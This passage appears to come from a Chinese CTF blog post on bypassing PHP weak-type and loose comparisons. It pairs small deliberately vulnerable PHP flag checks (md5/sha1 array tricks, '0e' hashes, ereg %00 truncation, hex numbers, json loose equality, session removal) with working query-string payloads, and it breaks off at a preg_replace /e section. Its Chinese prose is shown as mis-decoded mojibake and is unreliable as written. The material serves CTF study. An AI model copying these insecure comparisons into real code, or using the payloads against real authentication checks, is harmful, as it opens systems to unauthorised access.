allowed!&quot;</span>);<span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä½¿ç”¨GETä¼ å‚æ—¶ï¼Œæµè§ˆå™¨å°±å·²ç»æŠŠhakerDJè¿›è¡Œäº†ä¸€æ¬¡è§£ç äº†ï¼Œç„¶ååˆç”¨äº†urldecodeå‡½æ•°åˆå†æ¬¡è¿›è¡Œäº†ä¸€æ¬¡è§£ç ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å°†hakerDJè¿›è¡ŒäºŒæ¬¡ç¼–ç </p><pre><code class="hljs php">Payload: ?id=%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">41</span></code></pre><h2 id="md5-å‡½æ•°"><a class="header-anchor" href="#md5-å‡½æ•°">ğŸ­</a>md5()å‡½æ•°</h2><table><thead><tr><th>md5()</th><th>å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—</th></tr></thead><tbody><tr><td>==</td><td>åªéœ€è¦ç­‰å·ä¸¤è¾¹çš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚æ¯”å¦‚â€˜1â€™==1å°±æˆç«‹ï¼Œè¿”å›true</td></tr><tr><td>===</td><td>éœ€è¦å…¨ç­‰å·ä¸¤è¾¹çš„å€¼å’Œç±»å‹å…¨éƒ½ç›¸ç­‰æ‰æˆç«‹</td></tr></tbody></table><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;username&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;password&#x27;</span>])      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]))      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag);    <span class="hljs-keyword">else</span>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚</p><pre><code class="hljs php">Payload:?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a class="header-anchor" href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡">ğŸ­</a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs c">&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(isset($a)) &#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;echo <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;echo <span class="hljs-string">&quot;false!!!&quot;</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;echo <span class="hljs-string">&quot;please input a&quot;</span>;&#125;?&gt;</code></pre><p>å­—ç¬¦ä¸²QNKCDZOè¢«md5åŠ å¯†åä¹‹åæ˜¯å‰ä¸¤ä½ä¸º<code>0e</code>ï¼ŒPHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²çš„md5ä¹‹åçš„ç»“æœä¹Ÿä¸ºe0xxxçš„å°±å¯ä»¥ç»•è¿‡ã€‚</p><pre><code class="hljs php">Payload: ?a=s878926199a</code></pre><h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a class="header-anchor" href="#æ•°ç»„è¿”å›NULLç»•è¿‡">ğŸ­</a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><p>demo:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, $_GET[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . $flag);    <span class="hljs-keyword">else</span>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><blockquote><p>ereg()</p><blockquote><p>æœç´¢ç”±æŒ‡å®šçš„å­—ç¬¦ä¸²ä½œä¸ºç”±æ¨¡å¼æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå‘ç°æ¨¡å¼åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false</p></blockquote></blockquote><blockquote><p>strops()</p><blockquote><p>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p></blockquote></blockquote><p>eregå‡½æ•°ä¼šå¯¹ä¼ å…¥çš„passwordä»<code>a-z,A-Z,0-9</code> è¿›è¡ŒåŒ¹é…ï¼Œä¹Ÿå°±æ˜¯å¯†ç è¢«é™åˆ¶åœ¨è¿™ä¸‰ç§å­—ç¬¦ä¸­</p><h4 id="æ³•ä¸€ï¼š"><a class="header-anchor" href="#æ³•ä¸€ï¼š">ğŸ­</a>æ³•ä¸€ï¼š</h4><p><code>strpos()</code>éœ€è¦åŒ¹é…åˆ°<code>--</code>æ‰èƒ½è¾“å‡ºflagï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡<code>strpos()</code>å‡½æ•°ã€‚<code>strpos()</code>å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¼šè¿”å›NULLã€‚</p><pre><code class="hljs php">Payload: ?password[]=<span class="hljs-number">1</span></code></pre><h4 id="æ³•äºŒï¼š"><a class="header-anchor" href="#æ³•äºŒï¼š">ğŸ­</a>æ³•äºŒï¼š</h4><p>æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„, æˆ‘ä»¬å¯ä»¥ç”¨%00æ¥æˆªæ–­ï¼Œåœ¨%00ä¹‹åçš„æ•°å€¼å‡½æ•°æ— æ³•è¯†åˆ«</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>--</code></pre><h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a class="header-anchor" href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡">ğŸ­</a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>) &#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><p>ä¼ å…¥çš„å€¼ä¼šè¢«is_numericå‡½æ•°è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœä¸ºæ•°å­—å°±ç›´æ¥è¾“å‡ºno numericï¼Œä¼ å‚<code>password=2000a</code>æ—¢ä¸æ˜¯ä¸€ä¸ªæ•°å­—åˆå¤§äº1336,è¿”å›NULLå³å¯ç»•è¿‡ã€‚</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">2000</span>a</code></pre><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a class="header-anchor" href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡">ğŸ­</a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;var_dump($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>;var_dump($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]);var_dump(sha1($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]));var_dump(sha1($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]));<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;name&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;password&#x27;</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag); <span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;&#125; <span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œé€šè¿‡æ„é€ æ•°ç»„ï¼Œå°†æŠ¥é”™å¹¶è¿”å›falseï¼Œä½¿æ¡ä»¶æˆç«‹ï¼Œè¿™æ ·å°±ç»•è¿‡äº†sha1()å‡½æ•°ï¼Œè·å¾—flag</p><pre><code class="hljs php">Payload: ?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a class="header-anchor" href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ">ğŸ­</a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params">$temp</span>) </span>&#123;$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;$one = ord(<span class="hljs-string">&#x27;1&#x27;</span>);<span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$nine = ord(<span class="hljs-string">&#x27;9&#x27;</span>);<span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span>$number = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++) &#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp &#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre><p>è¿™é¢˜å¾ˆç®€å•ï¼Œå‚æ•°ä¸èƒ½æœ‰1-9çš„æ•°å­—ï¼ŒåŒæ—¶è¦æ±‚è¯¥å‚æ•°å€¼ä¸º3735929054ï¼Œæ‰€ä»¥æŠŠå€¼è½¬æ¢æˆåå…­è¿›åˆ¶ä¼ å‚å³å¯</p><pre><code class="hljs apache"><span class="hljs-attribute">Payload</span>: ?password=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de</code></pre><h2 id="10-eregæ­£åˆ™-00æˆªæ–­"><a class="header-anchor" href="#10-eregæ­£åˆ™-00æˆªæ–­">ğŸ­</a>10. eregæ­£åˆ™%00æˆªæ–­</h2><p>demoï¼š</p><pre><code class="hljs c">&lt;?php$flag = <span class="hljs-string">&quot;xxx&quot;</span>;if (isset ($_GET[&#x27;password&#x27;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;echo &#x27;You password must be alphanumeric&#x27;;&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® &#123;die(&#x27;Flag: &#x27; . $flag);&#125; <span class="hljs-keyword">else</span> &#123;echo(&#x27;have not been found&#x27;);&#125;&#125; <span class="hljs-keyword">else</span> &#123;echo &#x27;Invalid password&#x27;;&#125;&#125;?&gt;</code></pre><p>ä¼ å…¥çš„å€¼å¿…é¡»æ˜¯æ•°å­—æˆ–å¤§å°å†™å­—ç¬¦ï¼Œé•¿åº¦å°äº8ä¸”å¤§äº9999999,ä¸”åŒ¹é…åˆ°&quot;<em>-</em>&quot;æ‰èƒ½è¾“å‡ºflagã€‚å¯ä»¥ä½¿ç”¨<code>%00</code>æ¥æˆªæ–­ï¼Œå½“eregå‡½æ•°è¯»åˆ° <code>%00</code>çš„æ—¶å€™ï¼Œå°±æˆªæ­¢äº†ã€‚</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*</code></pre><h2 id="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"><a class="header-anchor" href="#æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡">ğŸ­</a>æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span> == $_SERVER[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, $password)) <span class="hljs-comment">//preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… &#123;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>) &#123;$reg = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt) &#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == $password)               <span class="hljs-keyword">echo</span> $flag;         <span class="hljs-keyword">else</span>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä»£ç ä¸­æ¶‰åŠåˆ°çš„ä¸€äº›æ­£åˆ™å‡½æ•°</p><blockquote><p>preg_match</p><blockquote><p>æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒåŒ¹é…åˆ°åˆ™è¿”å›1ï¼ŒåŒ¹é…ä¸åˆ°åˆ™è¿”å›0  .ç¬¬ä¸€æ¬¡åŒ¹é…æˆåŠŸåå°±åœæ­¢åŒ¹é…</p></blockquote></blockquote><blockquote><p>preg_match_all</p><blockquote><p>æ‰§è¡Œä¸€ä¸ªå…¨å±€æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œè¿”å›æˆåŠŸæ¨¡å¼åŒ¹é…çš„æ¬¡æ•°ï¼Œå¹¶å°†åŒ¹é…ç»“æœå­˜å‚¨åˆ°ä¸€ä¸ªæ•°ç»„ä¸­.  åŒ¹é…åˆ°å­—ç¬¦ä¸²ç»“æŸä¸ºæ­¢</p></blockquote></blockquote><p>ä¸‹é¢è¿˜æœ‰å‡ ä¸ªæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼š</p><table><thead><tr><th>æ­£åˆ™åŒ¹é…å­—ç¬¦</th><th>æè¿°</th><th>ASCII</th></tr></thead><tbody><tr><td>[:graph:]</td><td>é™¤ç©ºæ ¼ï¼ŒTABå¤–çš„æ‰€æœ‰å­—ç¬¦</td><td>[\x21-\x7E]</td></tr><tr><td>[a-zA-Z0-9]</td><td>å¤§å°å†™å­—æ¯å’Œæ•°å­—</td><td>[a-zA-Z0-9]</td></tr><tr><td>[:alpha:]</td><td>å¤§å°å†™å­—æ¯</td><td>[a-zA-Z]</td></tr><tr><td>[:punct:]</td><td>ä»»ä½•æ ‡ç‚¹ç¬¦å·</td><td>[!&quot;#$%&amp;â€™()*+,-./:;&lt;=&gt;?@[]^_`{} ~]</td></tr><tr><td>[:digit:]</td><td>ä»»ä½•æ•°å­—</td><td>[0-9]</td></tr><tr><td>[:upper:]</td><td>ä»»ä½•å¤§å†™å­—æ¯</td><td>[A-Z]</td></tr><tr><td>[:lower:]</td><td>ä»»ä½•å°å†™å­—æ¯</td><td>[a-z]</td></tr></tbody></table><p>é¢˜ç›®è¦æ±‚ï¼š</p><ul><li>è¯·æ±‚æ–¹æ³•å¿…é¡»ä¸ºPOST</li><li>æ­£åˆ™åŒ¹é…ï¼Œ[:graph:]ä¸ºä»»æ„å­—ç¬¦ï¼Œè¦æ±‚passwordé•¿åº¦è¶…è¿‡12</li><li>passwordä¸­å¿…é¡»åŒ…å«æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼Œå¹¶ä¸”æ£€æµ‹æ¬¡æ•°è¦è¶…è¿‡6æ¬¡</li><li>æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œå°å†™å­—æ¯ï¼ŒåŒ…å«3ç§ä»¥ä¸Šç»•è¿‡</li><li>å¼±ç±»å‹æ¯”è¾ƒï¼Œ42abc,å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—</li></ul><p>æ„é€ Payloadï¼Œå±…ç„¶æç¤º<code>Wrong password</code></p><pre><code class="hljs routeros">Payload: <span class="hljs-attribute">flag</span>=42BugKuctf.a</code></pre><h2 id="md4ç»•è¿‡"><a class="header-anchor" href="#md4ç»•è¿‡">ğŸ­</a>md4ç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&quot;a&quot;</span>] != hash(<span class="hljs-string">&quot;md4&quot;</span>, $_GET[<span class="hljs-string">&quot;a&quot;</span>])) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Theshy is locked&#x27;</span>);&#125;</code></pre><p>md4å¯ä»¥é€šè¿‡ç§‘å­¦è®¡ç®—æ³•æ¯”è¾ƒç»•è¿‡ã€‚æ‰¾ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç§‘å­¦è®¡ç®—æ³•0eå¼€å¤´çš„ï¼Œå…¶md4åŠ å¯†åä¹Ÿä¸º0eå¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ã€‚</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr></tbody></table><p>Payloadï¼š</p><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=0e251288019æˆ–?<span class="hljs-attribute">a</span>=0e001233333333333334557778889</code></pre><h2 id="jsonç»•è¿‡"><a class="header-anchor" href="#jsonç»•è¿‡">ğŸ­</a>jsonç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;    $message = json_decode($_POST[<span class="hljs-string">&#x27;message&#x27;</span>]);    $key =<span class="hljs-string">&quot;*********&quot;</span>;    <span class="hljs-keyword">if</span> ($message-&gt;key == $key) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œè§£ç åçš„messageä¸keyå€¼ç›¸åŒæ‰ä¼šå¾—åˆ°flagï¼Œä½¿ç”¨å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œkeyè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ª0å°±å¯ä»¥ç›¸ç­‰äº†ï¼Œé€šè¿‡0==&quot;admin&quot;è¿™ç§å½¢å¼ç»•è¿‡ã€‚</p><pre><code class="hljs php">Payload: message=&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-number">0</span>&#125;</code></pre><h2 id="SESSIONéªŒè¯ç»•è¿‡"><a class="header-anchor" href="#SESSIONéªŒè¯ç»•è¿‡">ğŸ­</a>SESSIONéªŒè¯ç»•è¿‡</h2><p>åœ¨PHPé…ç½®ä¸­çš„é»˜è®¤æƒ…å†µä¸‹ï¼ŒSessionæ˜¯ç”¨Session IDæ¥ç¡®å®šå½“å‰å¯¹è¯æ‰€å¯¹åº”çš„æœåŠ¡å™¨Sessionï¼ŒsessionIDå¯åœ¨cookieä¸­æ‰¾åˆ°ï¼Œå½“æˆ‘ä»¬åˆ é™¤cookieä¸­çš„sessionIDåï¼Œ$_SESSION[â€˜passwordâ€™]å°±ä¼šè¿”å›ç©ºï¼Œæˆ‘ä»¬åŒæ ·ä¼ å…¥ç©ºçš„passwordå°±èƒ½ç»•è¿‡äº†</p><p>demoï¼š</p><img src="/2021/04/17/lowtype/1.jpg" alt="1" style="zoom:67%;"><p>åˆ æ‰sessionå€¼ï¼Œæˆ–è€…ä¿®æ”¹sessionå€¼ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„sessionï¼ŒæœåŠ¡å™¨è·å–ä¸åˆ°sessionï¼Œåˆ™passwordä¸ºç©ºï¼Œæˆ‘ä»¬å†GETä¸€ä¸ªç©ºçš„passwordå³å¯æ‹¿åˆ°flag</p><h2 id="preg-replace-e-æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ"><a class="header-anchor" href="#preg-replace-e-æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ">ğŸ­</a>preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œ</h2><blockquote><p>preg_replace<br>å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><blockquote><p><code> mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )</code><br>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ replacement è¿›è¡Œæ›¿æ¢,$pattern å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ,/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ preg_replace() å°† $replacement å½“åšphpä»£ç æ¥æ‰§è¡Œ</p><p>è¯¦è§:<a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></p></blockquote></blockquote><h4 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a class="header-anchor" href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤">ğŸ­</a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h4><p>æ ¹æ®åŸé¡µé¢è¯»å–next.phpï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>];$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<span class="hljs-function"><span 